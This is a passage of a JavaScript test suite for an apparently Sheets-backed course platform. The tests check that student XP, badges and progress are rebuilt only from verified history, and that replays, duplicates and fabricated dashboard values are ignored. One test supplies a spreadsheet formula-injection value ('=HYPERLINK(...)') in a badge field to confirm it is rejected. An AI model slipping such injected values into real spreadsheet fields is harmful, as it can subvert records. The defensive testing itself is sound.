     Number(restored[g3.C.XP - 1]) === 999999 && String(restored[g3.C.RANK - 1]) === 'Virtuoso',
     restored[g3.C.XP - 1]);
  ok('T-REC28 restore leaves the trusted server state alone',
     String(restored[g3.C.SXP - 1]) === '0' && String(restored[g3.C.SGATES - 1]) === '');

  /* ── a migrated student carries on correctly ── */
  rt2.resetCache();
  const lg = g2.apiLogin_({ code: 'AAP-GOOD-0001', deviceId: 'dev-a', ua: 'Chrome' });
  ok('T-REC29 a rebuilt student logs in with their rebuilt state',
     lg.ok === true && lg.state.xp === 175 && lg.state.gates.length === 3, lg.state);
  const kl = g2.apiLogin_({ code: 'AAP-S58H-N22X', deviceId: 'dev-k', ua: 'Chrome' });
  ok('T-REC30 the manipulated account starts from zero and can still study',
     kl.ok === true && kl.state.xp === 0 && kl.state.progressPct === 0, kl.state);
  const earn = g2.apiGrade_({ code: 'AAP-S58H-N22X', token: kl.token, deviceId: 'dev-k',
                              gate: 'm5-kc', answer: 6 });
  ok('T-REC31 and earns real XP from there', earn.correct === true && earn.state.xp === 60, earn.state);
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('IDEMPOTENCE — REPLAYS AND DUPLICATES CANNOT INFLATE ANYTHING');
{
  /* Build a history from an arbitrary list of [gate, result, ts, sid, attempt,
     award, verified] and reconstruct from it. */
  function reconstruct(rows) {
    const rt = makeRuntime(); const g = rt.ctx;
    g.initSheet_(g.SH_CODES, g.CODES_HEADERS.slice(0, 24));
    g.initSheet_(g.SH_ASSESS, g.ASSESS_HEADERS);
    g.sheet_(g.SH_CODES).getRange(2, 1, 1, 24).setValues([
      ['AAP-IDEM-0001', 'ACTIVE', 'Ida', 'X', 'dev-i', new Date('2026-06-01'), new Date('2026-07-01'),
       1, 0, 0, '', '', '', 0, 0, 0, 0, '', 0, 0, 0, '', '', '']
    ]);
    g.appendRows_(g.SH_ASSESS, rows.map(r => [
      r[2] || new Date('2026-06-10T09:00:00Z'), 'AAPIDEM0001', 'Ida', 'X', 'm1',
      r[0], 'activity', '', r[1], r[4] || '', r[5] || 0, r[3] || 's-1', r[6] || '', ''
    ]));
    const plan = g.migrationPlan_();
    return { g, plan, row: plan.rows.find(x => x.code === 'AAP-IDEM-0001') };
  }

  const base = reconstruct([['m1-gal', 'COMPLETED']]);
  ok('T-IDEM1 one completion is worth its answer-key value', base.row.seed.xp === 40, base.row.seed.xp);

  /* ── the exact case in the brief ── */
  const replayed = reconstruct([
    ['m1-gal', 'COMPLETED', new Date('2026-06-10T09:00:00Z')],
    ['m1-gal', 'REPLAY',    new Date('2026-06-11T09:00:00Z')],
    ['m1-gal', 'REPLAY',    new Date('2026-06-12T09:00:00Z')]
  ]);
  ok('T-IDEM2 COMPLETED + REPLAY + REPLAY is NOT 3x the XP',
     replayed.row.seed.xp === 40, replayed.row.seed.xp);
  ok('T-IDEM3 …and counts as one activity, not three',
     replayed.row.seed.gates.length === 1 && replayed.row.derived.activities === 1);
  ok('T-IDEM4 …and does not inflate progress or lessons',
     replayed.row.derived.progress === base.row.derived.progress &&
     replayed.row.derived.lessons === base.row.derived.lessons);

  /* ── repeated COMPLETED (student cleared localStorage and redid the module) ── */
  const redone = reconstruct([
    ['m1-gal', 'COMPLETED', new Date('2026-06-10T09:00:00Z'), 's-1'],
    ['m1-gal', 'COMPLETED', new Date('2026-07-20T09:00:00Z'), 's-9'],
    ['m1-gal', 'COMPLETED', new Date('2026-08-01T09:00:00Z'), 's-9']
  ]);
  ok('T-IDEM5 three legitimate COMPLETED rows for one activity still pay once',
     redone.row.seed.xp === 40 && redone.row.seed.gates.length === 1, redone.row.seed.xp);

  /* ── a legacy REPLAY-shaped row cannot pay, because REPLAY did not exist ── */
  const fakeReplay = reconstruct([
    ['m5-boss', 'COMPLETED', new Date('2026-06-10T09:00:00Z')],
    ['m5-boss', 'REPLAY', new Date('2026-06-11T09:00:00Z'), 's-1', 1, 9999],   // no Verified column
    ['m5-boss', 'REPLAY', new Date('2026-06-12T09:00:00Z'), 's-1', 1, 9999]
  ]);
  ok('T-IDEM6 a REPLAY row with no server signature pays nothing, whatever XP it claims',
     fakeReplay.row.seed.xp === 120, fakeReplay.row.seed.xp);

  /* ── a genuine server-written boss replay pays, but is clamped ── */
  const realReplay = reconstruct([
    ['m5-boss', 'COMPLETED', new Date('2026-06-10T09:00:00Z'), 's-1', 1, 120, 'CHECKED'],
    ['m5-boss', 'REPLAY',    new Date('2026-06-11T09:00:00Z'), 's-2', 2, 42,  'CHECKED']
  ]);
  ok('T-IDEM7 a server-written boss replay adds its recorded award',
     realReplay.row.seed.xp === 162, realReplay.row.seed.xp);
  const clamped = reconstruct([
    ['m5-boss', 'COMPLETED', new Date('2026-06-10T09:00:00Z'), 's-1', 1, 120,   'CHECKED'],
    ['m5-boss', 'REPLAY',    new Date('2026-06-11T09:00:00Z'), 's-2', 2, 99999, 'CHECKED']
  ]);
  ok('T-IDEM8 a corrupted replay award is clamped to the 35% the grader can pay',
     clamped.row.seed.xp === 120 + Math.round(120 * 0.35), clamped.row.seed.xp);
  const nonBossReplay = reconstruct([
    ['m2-kc', 'COMPLETED', new Date('2026-06-10T09:00:00Z'), 's-1', 1, 75, 'CHECKED'],
    ['m2-kc', 'REPLAY',    new Date('2026-06-11T09:00:00Z'), 's-2', 2, 75, 'CHECKED']
  ]);
  ok('T-IDEM9 only speed rounds can pay on replay — a quiz cannot',
     nonBossReplay.row.seed.xp === 75, nonBossReplay.row.seed.xp);

  /* ── sync-retry duplicates ── */
  const t = new Date('2026-06-10T09:00:00Z');
  const clean = reconstruct([
    ['m2-dnd', 'WRONG',   t,                              's-1', 1],
    ['m2-dnd', 'CORRECT', new Date('2026-06-10T09:00:05Z'), 's-1', 2],
    ['m2-dnd', 'COMPLETED', new Date('2026-06-10T09:00:06Z'), 's-1', 2]
  ]);
  const withDupes = reconstruct([
    ['m2-dnd', 'WRONG',   t,                              's-1', 1],
    ['m2-dnd', 'WRONG',   t,                              's-1', 1],   // retry
    ['m2-dnd', 'WRONG',   t,                              's-1', 1],   // retry
    ['m2-dnd', 'CORRECT', new Date('2026-06-10T09:00:05Z'), 's-1', 2],
    ['m2-dnd', 'CORRECT', new Date('2026-06-10T09:00:05Z'), 's-1', 2], // retry
    ['m2-dnd', 'COMPLETED', new Date('2026-06-10T09:00:06Z'), 's-1', 2],
    ['m2-dnd', 'COMPLETED', new Date('2026-06-10T09:00:06Z'), 's-1', 2] // retry
  ]);
  ok('T-IDEM10 retried sync duplicates do not inflate attempts',
     withDupes.row.seed.attempts === clean.row.seed.attempts &&
     clean.row.seed.attempts === 2,
     { clean: clean.row.seed.attempts, dup: withDupes.row.seed.attempts });
  ok('T-IDEM11 …nor correct, XP, accuracy or streak',
     withDupes.row.seed.correct === clean.row.seed.correct &&
     withDupes.row.seed.xp === clean.row.seed.xp &&
     withDupes.row.derived.accuracy === clean.row.derived.accuracy &&
     withDupes.row.seed.streak === clean.row.seed.streak);
  ok('T-IDEM12 the duplicates are reported, not silently dropped',
     withDupes.row.diffs.some(d => /DUPLICATE_ROWS_IGNORED: 4 identical/.test(d)),
     withDupes.row.diffs);
  ok('T-IDEM13 two genuinely different answers a second apart are both kept', (() => {
    const two = reconstruct([
      ['m2-dnd', 'WRONG', new Date('2026-06-10T09:00:00Z'), 's-1', 1],
      ['m2-dnd', 'WRONG', new Date('2026-06-10T09:00:01Z'), 's-1', 2]
    ]);
    return two.row.seed.attempts === 2;
  })());

  /* ── pure idempotence: same input, same output; more of the same input, same output ── */
  const hist = [
    ['m1-gal', 'COMPLETED', new Date('2026-06-10T09:00:00Z'), 's-1'],
    ['m2-dnd', 'CORRECT',   new Date('2026-06-11T09:00:00Z'), 's-1', 1],
    ['m2-dnd', 'COMPLETED', new Date('2026-06-11T09:00:01Z'), 's-1', 1],
    ['m5-boss','COMPLETED', new Date('2026-06-12T09:00:00Z'), 's-2', 1]
  ];
  const a1 = reconstruct(hist).row;
  const a2 = reconstruct(hist).row;
  const fingerprint = r => JSON.stringify({ seed: r.seed, derived: r.derived });
  ok('T-IDEM14 reconstruction is deterministic', fingerprint(a1) === fingerprint(a2));

  const doubled = reconstruct(hist.concat(hist)).row;
  ok('T-IDEM15 feeding the identical history twice changes nothing at all',
     fingerprint(doubled) === fingerprint(a1),
     { once: a1.seed, twice: doubled.seed });

  const tripledReplays = reconstruct(hist.concat([
    ['m1-gal', 'REPLAY', new Date('2026-07-01T09:00:00Z'), 's-3'],
    ['m1-gal', 'REPLAY', new Date('2026-07-02T09:00:00Z'), 's-3'],
    ['m2-dnd', 'REPLAY', new Date('2026-07-03T09:00:00Z'), 's-3'],
    ['m5-boss','REPLAY', new Date('2026-07-04T09:00:00Z'), 's-3']
  ])).row;
  /* Property check over randomly generated histories, rather than only the
     cases above. Catches the class of bug where reconstruction happens to be
     stable for the shapes someone thought to write a test for. */
  ok('T-IDEM17 400 random histories are stable under repeat, duplication and reordering', (() => {
    const GATES = ['m1-gal', 'm2-dnd', 'm2-kc', 'm3-tabs', 'm5-boss', 'f1-car', 'f4-kc'];
    const RESULTS = ['COMPLETED', 'REPLAY', 'CORRECT', 'WRONG'];
    let seed = 12345;
    const rnd = n => (seed = (seed * 1103515245 + 12345) & 0x7fffffff) % n;

    for (let trial = 0; trial < 400; trial++) {
      const rows = [];
      for (let i = 0, n = 1 + rnd(14); i < n; i++) {
        rows.push([GATES[rnd(GATES.length)], RESULTS[rnd(RESULTS.length)],
                   new Date(1780000000000 + rnd(500) * 1000), 's-' + rnd(3),
                   1 + rnd(3), rnd(200)]);
      }
      const fp = rs => JSON.stringify(reconstruct(rs).row.seed) +
                       JSON.stringify(reconstruct(rs).row.derived);
      const a = fp(rows);
      if (fp(rows.slice()) !== a) return 'trial ' + trial + ': not deterministic';
      if (fp(rows.concat(rows)) !== a) return 'trial ' + trial + ': duplication changed it';
      if (fp(rows.slice().reverse()) !== a) return 'trial ' + trial + ': row order changed it';
      if (fp(rows.concat(rows.filter(r => r[1] === 'REPLAY'))) !== a) {
        return 'trial ' + trial + ': extra replays changed it';
      }
    }
    return true;
  })() === true);

  ok('T-IDEM16 adding unsigned replays leaves XP, activities and badges untouched',
     tripledReplays.seed.xp === a1.seed.xp &&
     tripledReplays.derived.activities === a1.derived.activities &&
     tripledReplays.seed.badgeIds.join(',') === a1.seed.badgeIds.join(','),
     { before: a1.seed.xp, after: tripledReplays.seed.xp });
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('BADGES — TRUSTED vs UNVERIFIABLE LEGACY');
{
  function badgeDb(legacyCount, legacyList, historyRows) {
    const rt = makeRuntime(); const g = rt.ctx;
    g.initSheet_(g.SH_CODES, g.CODES_HEADERS.slice(0, 24));
    g.initSheet_(g.SH_ASSESS, g.ASSESS_HEADERS.slice(0, 12));
    g.sheet_(g.SH_CODES).getRange(2, 1, 1, 24).setValues([
      ['AAP-BDG-0001', 'ACTIVE', 'Bea', 'X', 'dev-b', new Date('2026-06-01'), new Date('2026-07-01'),
       1, 0, 0, '', '', '', 0, 0, 0, legacyCount, legacyList, 0, 0, 0, '', '', '']
    ]);
    if (historyRows.length) g.appendRows_(g.SH_ASSESS, historyRows.map(r =>
      [new Date('2026-06-10'), 'AAPBDG0001', 'Bea', 'X', 'm1', r[0], 'activity', '', r[1], 1, 0, 's-1']));
    return { rt, g };
  }

  /* (a) fabricated legacy badges with no supporting history */
  {
    const { g } = badgeDb(15, 'Full Scholar, Midterm Master, Final Term Champ', []);
    const row = g.migrationPlan_().rows[0];
    ok('T-BDG1 fabricated legacy badges become no trusted badges',
       row.seed.badgeIds.length === 0 && row.derived.badgeList === '', row.seed.badgeIds);
    ok('T-BDG2 …and are reported as contradicted, not merely as a difference',
       row.flags.some(f => /BADGES_CONTRADICTED/.test(f)) &&
       !row.diffs.some(d => /BADGES_/.test(d)), { flags: row.flags, diffs: row.diffs });
    ok('T-BDG3 …and cannot reach XP, level, rank or progress',
       row.seed.xp === 0 && row.derived.level === 1 &&
       row.derived.rank === 'Apprentice' && row.derived.progress === 0);
  }

  /* (b) provable badges */
  {
    const { g } = badgeDb(1, 'Shutterbug', [['m1-gal', 'COMPLETED']]);
    const row = g.migrationPlan_().rows[0];
    ok('T-BDG4 a badge the activity set demonstrates IS awarded',
       row.seed.badgeIds.indexOf('shutterbug') >= 0 &&
       row.seed.badgeIds.indexOf('first-steps') >= 0, row.seed.badgeIds);
    ok('T-BDG5 …and is not flagged as unsupported',
       !row.flags.some(f => /BADGES/.test(f)), row.flags);
  }

  /* (c) legitimate-looking but unverifiable — "Sharp Eye" needs a clean run */
  {
    const { g } = badgeDb(3, 'Sharp Eye, Clean Sort, Shutterbug',
                          [['m1-gal', 'COMPLETED'], ['m2-dnd', 'COMPLETED'], ['m2-kc', 'COMPLETED']]);
    const plan = g.migrationPlan_();
    const row = plan.rows[0];
    ok('T-BDG6 "no misses" badges are NOT silently promoted to trusted',
       row.seed.badgeIds.indexOf('sharp-eye') < 0 && row.seed.badgeIds.indexOf('sorter') < 0,
       row.seed.badgeIds);
    ok('T-BDG7 …and the shortfall is reported as unverified, not as contradicted',
       row.diffs.some(d => /BADGES_UNVERIFIED/.test(d)) &&
       !row.flags.some(f => /BADGES/.test(f)), { diffs: row.diffs, flags: row.flags });

    /* the evidence must survive the migration */
    g.migrateSchema();
    const rec = g.sheet_(g.SH_CODES).getRange(2, 1, 1, g.CODES_HEADERS.length).getValues()[0];
    const legacy = JSON.parse(String(rec[g.C.LEGBADGES - 1]));
    ok('T-BDG8 the legacy badge list is preserved verbatim, labelled not-trusted',
       legacy.legacyList === 'Sharp Eye, Clean Sort, Shutterbug' && legacy.legacyCount === 3 &&
       /NOT TRUSTED STATE/.test(legacy.note) && legacy.unverified.length === 2, legacy);
    ok('T-BDG9 …in a column no scoring code reads', (() => {
      const st = g.readState_(rec);
      const d = g.derive_(st);
      return d.badgeCount === 2 && d.badgeList.indexOf('Sharp Eye') < 0;
    })());
    ok('T-BDG10 …and it is also in _PreMigration',
       JSON.parse(String(rec[g.C.PREMIG - 1])).badgeList === 'Sharp Eye, Clean Sort, Shutterbug');
    ok('T-BDG11 the trusted badge column holds only provable ids',
       String(rec[g.C.SBADGES - 1]).split(',').sort().join(',') === 'first-steps,shutterbug',
       rec[g.C.SBADGES - 1]);
  }
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('BADGE EVIDENCE — PROVEN / UNVERIFIED / CONTRADICTED');
{
  /* history rows: [gate, result]  — answer rows are CORRECT/WRONG */
  function bdb(legacyCount, legacyList, historyRows) {
    const rt = makeRuntime(); const g = rt.ctx;
    g.initSheet_(g.SH_CODES, g.CODES_HEADERS.slice(0, 24));
    g.initSheet_(g.SH_ASSESS, g.ASSESS_HEADERS.slice(0, 12));
    g.initSheet_(g.SH_SEC, g.SEC_HEADERS);
    g.sheet_(g.SH_CODES).getRange(2, 1, 1, 24).setValues([
      ['AAP-EVID-0001', 'ACTIVE', 'Eve', 'X', 'dev-e', new Date('2026-06-01'), new Date('2026-07-01'),
       1, 0, 0, '', '', '', 0, 0, 0, legacyCount, legacyList, 0, 0, 0, '', '', '']
    ]);
    if (historyRows.length) g.appendRows_(g.SH_ASSESS, historyRows.map((r, i) =>
      [new Date(1780000000000 + i * 1000), 'AAPEVID0001', 'Eve', 'X', 'm1',
       r[0], 'activity', '', r[1], 1, 0, 's-1']));
    const row = g.migrationPlan_().rows[0];
    return { g, row, audit: row.badgeAudit };
  }
  const has = (list, id) => list.some(x => x.id === id);

  /* ── 1. PROVEN ── a clean run that the history actually shows ── */
  {
    const { row, audit } = bdb(2, 'Sharp Eye, Shutterbug',
      [['m1-gal', 'COMPLETED'], ['m5-kc', 'CORRECT'], ['m5-kc', 'COMPLETED']]);
    ok('T-EV1 a no-miss badge with a clean answer record is PROVEN',
       has(audit.proven, 'sharp-eye'), audit);
    ok('T-EV2 …and lands in _ServerBadges', row.seed.badgeIds.indexOf('sharp-eye') >= 0,
       row.seed.badgeIds);
    ok('T-EV3 a clear-type badge whose activity is completed is PROVEN',
       has(audit.proven, 'shutterbug') && row.seed.badgeIds.indexOf('shutterbug') >= 0);
    ok('T-EV4 nothing is reported as unverified or contradicted',
       audit.unverified.length === 0 && audit.contradicted.length === 0, audit);
  }

  /* ── 2. UNVERIFIED ── activity completed, answer rows did not survive ── */
  {
    const { g, row, audit } = bdb(3, 'Sharp Eye, Clean Sort, Matchmaker',
      [['m5-kc', 'COMPLETED'], ['m2-dnd', 'COMPLETED'], ['m3-match', 'COMPLETED']]);
    ok('T-EV5 a no-miss badge with no surviving answer rows is UNVERIFIED',
       has(audit.unverified, 'sharp-eye') && has(audit.unverified, 'sorter') &&
       has(audit.unverified, 'matchmaker'), audit);
    ok('T-EV6 …and is NOT contradicted', audit.contradicted.length === 0, audit.contradicted);
    ok('T-EV7 …and does NOT enter _ServerBadges',
       ['sharp-eye', 'sorter', 'matchmaker'].every(b => row.seed.badgeIds.indexOf(b) < 0),
       row.seed.badgeIds);
    ok('T-EV8 the reason says it can be neither shown nor ruled out',
       /neither shown nor ruled out/.test(audit.unverified[0].why), audit.unverified[0]);
    ok('T-EV9 it is filed as a difference, not as a flag',
       row.diffs.some(d => /BADGES_UNVERIFIED \(3\)/.test(d)) &&
       !row.flags.some(f => /BADGES_CONTRADICTED/.test(f)), { d: row.diffs, f: row.flags });

    /* the evidence must survive to the sheet */
    g.migrateSchema();
    const rec = g.sheet_(g.SH_CODES).getRange(2, 1, 1, g.CODES_HEADERS.length).getValues()[0];
    const leg = JSON.parse(String(rec[g.C.LEGBADGES - 1]));
    ok('T-EV10 _LegacyBadges_UNVERIFIED preserves the unverified evidence',
       leg.unverified.length === 3 && /Sharp Eye/.test(leg.unverified.join('|')) &&
       leg.legacyList === 'Sharp Eye, Clean Sort, Matchmaker' && /NOT TRUSTED STATE/.test(leg.note),
       leg);
    ok('T-EV11 _PreMigration preserves the original badge value',
       JSON.parse(String(rec[g.C.PREMIG - 1])).badgeList === 'Sharp Eye, Clean Sort, Matchmaker' &&
       JSON.parse(String(rec[g.C.PREMIG - 1])).badges === 3);
    ok('T-EV12 _ServerBadges holds only proven badges',
       String(rec[g.C.SBADGES - 1]).split(',').filter(Boolean).sort().join(',') === 'first-steps',
       rec[g.C.SBADGES - 1]);
  }

  /* ── 3. CONTRADICTED (a) ── a recorded miss in the very activity ── */
  {
    const { row, audit } = bdb(1, 'Sharp Eye',
      [['m5-kc', 'WRONG'], ['m5-kc', 'CORRECT'], ['m5-kc', 'COMPLETED']]);
    ok('T-EV13 a no-miss badge with a recorded miss is CONTRADICTED',
       has(audit.contradicted, 'sharp-eye'), audit);
    ok('T-EV14 …with the activity named in the reason',
       /records a miss in m5-kc/.test(audit.contradicted[0].why), audit.contradicted[0]);
    ok('T-EV15 …is reported explicitly as contradicted',
       row.flags.some(f => /BADGES_CONTRADICTED \(1\).*Sharp Eye/.test(f)), row.flags);
    ok('T-EV16 …and does not enter _ServerBadges', row.seed.badgeIds.indexOf('sharp-eye') < 0);
  }

  /* ── 3. CONTRADICTED (b) ── no activity that could have earned it ── */
  {
    const { audit } = bdb(2, 'Clean Sort, Chord Collector', [['m1-gal', 'COMPLETED']]);
    ok('T-EV17 a badge with no supporting completed activity is CONTRADICTED',
       has(audit.contradicted, 'sorter') && has(audit.contradicted, 'guitarist'), audit);
    ok('T-EV18 …with the required activity named',
       /requires m2-dnd or m4-dnd, none of which history shows completed/.test(
         audit.contradicted.find(x => x.id === 'sorter').why));
  }

  /* ── 3. CONTRADICTED (c) ── streak and module badges ── */
  {
    const { audit } = bdb(2, 'On Fire, Full Scholar',
      [['m5-kc', 'CORRECT'], ['m5-kc', 'WRONG'], ['m5-kc', 'COMPLETED']]);
    ok('T-EV19 a streak badge is CONTRADICTED when the surviving run is shorter',
       has(audit.contradicted, 'combo5') && /best run in the surviving history is 1/.test(
         audit.contradicted.find(x => x.id === 'combo5').why), audit.contradicted);
    ok('T-EV20 a module badge is CONTRADICTED without a finished module',
       has(audit.contradicted, 'scholar'));
  }
  {
    const { audit } = bdb(1, 'On Fire', [['m1-gal', 'COMPLETED']]);
    ok('T-EV21 a streak badge with no answer rows at all is UNVERIFIED, not contradicted',
       has(audit.unverified, 'combo5'), audit);
  }

  /* ── 4. Keni: fabricated set, zero recognised activity ── */
  {
    const { g, row, audit } = bdb(15, 'Full Scholar, Midterm Master, Final Term Champ, Sharp Eye',
      [['x', 'COMPLETED'], ['x', 'COMPLETED'], ['x', 'COMPLETED']]);
    ok('T-EV22 every fabricated badge is CONTRADICTED, none unverified',
       audit.contradicted.length === 4 && audit.unverified.length === 0 &&
       audit.proven.length === 0, audit);
    ok('T-EV23 the unnamed remainder of the count is reported',
       audit.unreadable === 11 &&
       row.flags.some(f => /BADGES_UNNAMED: the dashboard counts 11 badge\(s\) it does not name/.test(f)),
       { unreadable: audit.unreadable, flags: row.flags });
    ok('T-EV24 no fabricated badge reaches trusted state',
       row.seed.badgeIds.length === 0 && row.derived.badgeCount === 0 &&
       row.derived.badgeList === '', row.seed.badgeIds);
    g.migrateSchema();
    const rec = g.sheet_(g.SH_CODES).getRange(2, 1, 1, g.CODES_HEADERS.length).getValues()[0];
    ok('T-EV25 _ServerBadges is empty on the sheet', String(rec[g.C.SBADGES - 1]) === '');
    ok('T-EV26 …but the claim is still preserved as evidence',
       JSON.parse(String(rec[g.C.LEGBADGES - 1])).legacyCount === 15 &&
       JSON.parse(String(rec[g.C.PREMIG - 1])).badges === 15);
  }

  /* ── 5. UNVERIFIED badges must not touch any trusted calculation ── */
  {
    const history = [['m1-gal', 'COMPLETED'], ['m2-dnd', 'COMPLETED'], ['m5-boss', 'COMPLETED']];
    const without = bdb(0, '', history);
    const withUnv = bdb(4, 'Sharp Eye, Clean Sort, Matchmaker, Flawless Victory', history);
    const trusted = r => JSON.stringify({
      xp: r.seed.xp, correct: r.seed.correct, attempts: r.seed.attempts,
      streak: r.seed.streak, gates: r.seed.gates, badges: r.seed.badgeIds,
      level: r.derived.level, rank: r.derived.rank, accuracy: r.derived.accuracy,
      progress: r.derived.progress, lessons: r.derived.lessons,
      activities: r.derived.activities, badgeCount: r.derived.badgeCount
    });
    ok('T-EV27 trusted state is byte-identical with and without unverified legacy badges',
       trusted(without.row) === trusted(withUnv.row),
       { without: trusted(without.row), with: trusted(withUnv.row) });
    ok('T-EV28 …and the unverified ones were genuinely present to be ignored',
       withUnv.audit.unverified.length + withUnv.audit.contradicted.length === 4,
       withUnv.audit);
  }

  /* ── 6. the classification covers every badge the course defines ── */
  {
    const rt = makeRuntime(); const g = rt.ctx;
    const missing = Object.keys(g.BADGE_NAMES).filter(id => !g.BADGE_EVIDENCE[id]);
    ok('T-EV29 every badge has an evidence rule', missing.length === 0, missing);
    ok('T-EV30 an invented badge name is CONTRADICTED, never trusted', (() => {
      const st = { badges: {}, gates: {}, attempts: 0, streak: 0, byGate: {} };
      const a = g.auditLegacyBadges_('Grand Poobah, =HYPERLINK("http://x")', 2, st);
      return a.contradicted.length === 2 && a.proven.length === 0 && a.unverified.length === 0;
    })());
  }
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('TRUST BOUNDARY — THE DASHBOARD CANNOT REACH TRUSTED STATE');
{
  /* Behavioural proof: hold history constant, vary the dashboard wildly, and
     require the reconstructed state to be bit-identical. */
  function withDashboard(vals) {
    const rt = makeRuntime(); const g = rt.ctx;
    g.initSheet_(g.SH_CODES, g.CODES_HEADERS.slice(0, 24));
    g.initSheet_(g.SH_ASSESS, g.ASSESS_HEADERS.slice(0, 12));
    g.sheet_(g.SH_CODES).getRange(2, 1, 1, 24).setValues([
      ['AAP-TRST-0001', 'ACTIVE', 'T', 'X', 'dev-t', new Date('2026-06-01'), new Date('2026-07-01'),
       1, 0, vals.xp, vals.lvl, vals.rank, vals.acc, vals.correct, vals.attempts,
       vals.streak, vals.badges, vals.badgeList, vals.lessons, vals.progress, vals.acts, '', '', '']
    ]);
    g.appendRows_(g.SH_ASSESS, [
      [new Date('2026-06-10'), 'AAPTRST0001', 'T', 'X', 'm1', 'm1-gal', 'polaroids', '', 'COMPLETED', 1, 0, 's-1'],
      [new Date('2026-06-11'), 'AAPTRST0001', 'T', 'X', 'm2', 'm2-dnd', 'sorter', '', 'COMPLETED', 1, 0, 's-1']
    ]);
    const row = g.migrationPlan_().rows[0];
    return JSON.stringify({ seed: row.seed, derived: row.derived });
  }

  const zeros = withDashboard({ xp: 0, lvl: '', rank: '', acc: 0, correct: 0, attempts: 0,
                                streak: 0, badges: 0, badgeList: '', lessons: 0, progress: 0, acts: 0 });
  const huge  = withDashboard({ xp: 999999, lvl: 8, rank: 'Virtuoso', acc: 100, correct: 500,
                                attempts: 500, streak: 99, badges: 15, badgeList: 'Full Scholar',
                                lessons: 12, progress: 100, acts: 22 });
  ok('T-TRST1 the reconstructed state is identical whatever the dashboard says',
     zeros === huge, { zeros: zeros.slice(0, 160), huge: huge.slice(0, 160) });
  ok('T-TRST2 …and equals what the answer key values the proven work at (40+60)',
     JSON.parse(zeros).seed.xp === 100, JSON.parse(zeros).seed.xp);

  /* The XP figure must come from AnswerKey.gs and nowhere else. */
  {
    const rt = makeRuntime(); const g = rt.ctx;
    ok('T-TRST3 spec.xp comes from the answer key tables',
       g.GRADED['m2-dnd'].xp === 60 && g.CLAIMED['m1-gal'].xp === 40 &&
       g.gateSpec_('m2-dnd').xp === 60);
    ok('T-TRST4 an activity absent from the key has no value and cannot be credited',
       g.gateSpec_('x') === null && g.gateSpec_('FINAL_EXAM') === null);
    /* If the key says an activity is worth more, reconstruction must follow the
       key — proving the key, not the sheet, is the source. */
    g.GRADED['m2-dnd'].xp = 500;
    const bumped = (() => {
      g.initSheet_(g.SH_CODES, g.CODES_HEADERS.slice(0, 24));
      g.initSheet_(g.SH_ASSESS, g.ASSESS_HEADERS.slice(0, 12));
      g.sheet_(g.SH_CODES).getRange(2, 1, 1, 24).setValues([
        ['AAP-TRST-0002', 'ACTIVE', 'T', 'X', 'dev-t', new Date(), new Date(),
         1, 0, 0, '', '', '', 0, 0, 0, 0, '', 0, 0, 0, '', '', '']]);
      g.appendRows_(g.SH_ASSESS, [[new Date(), 'AAPTRST0002', 'T', 'X', 'm2', 'm2-dnd',
        'sorter', '', 'COMPLETED', 1, 0, 's-1']]);
      return g.migrationPlan_().rows[0].seed.xp;
    })();
    ok('T-TRST5 the answer key is what sets the amount', bumped === 500, bumped);
  }

  /* And the key is not reachable from a browser. */
  ok('T-TRST6 the answer key is not in any file the module downloads', (() => {
    const fs = require('fs');
    const shipped = ['assets/app.js', 'assets/auth.js', 'assets/content.js', 'assets/config.js', 'index.html']
      .map(f => fs.readFileSync(f, 'utf8')).join('\n');
    return !/GRADED|CLAIMED|QUIZ_FEEDBACK|gateSpec_|reconstructState_/.test(shipped);
  })());
  ok('T-TRST7 the key file is excluded from the published site', (() => {
    const fs = require('fs');
    const cfg = fs.readFileSync('_config.yml', 'utf8');
    return fs.existsSync('_apps-script/AnswerKey.gs') && /_apps-script\//.test(cfg) &&
           !fs.existsSync('.nojekyll');
  })());
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('INCOMPLETE HISTORY & ADMINISTRATIVE RECOVERY');
{
  const rt = makeRuntime(); const g = rt.ctx;
  g.initSheet_(g.SH_CODES, g.CODES_HEADERS.slice(0, 24));
  g.initSheet_(g.SH_ASSESS, g.ASSESS_HEADERS.slice(0, 12));
  g.initSheet_(g.SH_SEC, g.SEC_HEADERS);
  g.sheet_(g.SH_CODES).getRange(2, 1, 1, 24).setValues([
    // dashboard says 5 activities; history will evidence only 2
    ['AAP-GAPS-0001', 'ACTIVE', 'Gina', 'X', 'dev-g', new Date('2026-06-01'), new Date('2026-07-01'),
     9, 120, 300, 2, 'Sketcher', 80, 8, 10, 3, 2, 'Shutterbug, Curator', 1, 23, 5, 'm3', 's-g', 7]
  ]);
  g.appendRows_(g.SH_ASSESS, [
    [new Date('2026-06-10'), 'AAPGAPS0001', 'Gina', 'X', 'm1', 'm1-gal', 'polaroids', '', 'COMPLETED', 1, 0, 's-g'],
    [new Date('2026-06-11'), 'AAPGAPS0001', 'Gina', 'X', 'm2', 'm2-tabs', 'discover', '', 'COMPLETED', 1, 0, 's-g']
  ]);

  const row = g.migrationPlan_().rows[0];
  ok('T-GAP1 an incomplete history is flagged as such',
     row.flags.some(f => /HISTORY_INCOMPLETE: dashboard claims 5 activities, history evidences 2/.test(f)),
     row.flags);
  ok('T-GAP2 the size of the gap is preserved for review', row.legacy.historyDelta === 3);

  g.migrateSchema();
  const rec = () => g.sheet_(g.SH_CODES).getRange(2, 1, 1, g.CODES_HEADERS.length).getValues()[0];
  ok('T-GAP3 the delta is written to _HistoryDelta', Number(rec()[g.C.HISTDELTA - 1]) === 3);
  ok('T-GAP4 only the evidenced activities are credited',
     String(rec()[g.C.SGATES - 1]) === 'm1-gal,m2-tabs' && Number(rec()[g.C.SXP - 1]) === 85,
     [rec()[g.C.SGATES - 1], rec()[g.C.SXP - 1]]);

  /* Recovery is a separate, logged, authorised act — not a migration step. */
  const prompts = ['AAP-GAPS-0001', 'm3-tabs', 'GRANT'];
  let i = 0;
  g.Session = { getActiveUser: () => ({ getEmail: () => 'instructor@bulsu.edu.ph' }) };
  g.SpreadsheetApp.getUi = () => ({
    prompt: () => ({ getSelectedButton: () => 'OK', getResponseText: () => prompts[i++] }),
    alert: () => 'OK', Button: { OK: 'OK', YES: 'YES' },
    ButtonSet: { OK: 1, OK_CANCEL: 2, YES_NO: 3 }
  });
  g.grantActivityCredit();

  ok('T-GAP5 a granted credit is applied',
     String(rec()[g.C.SGATES - 1]).indexOf('m3-tabs') >= 0 &&
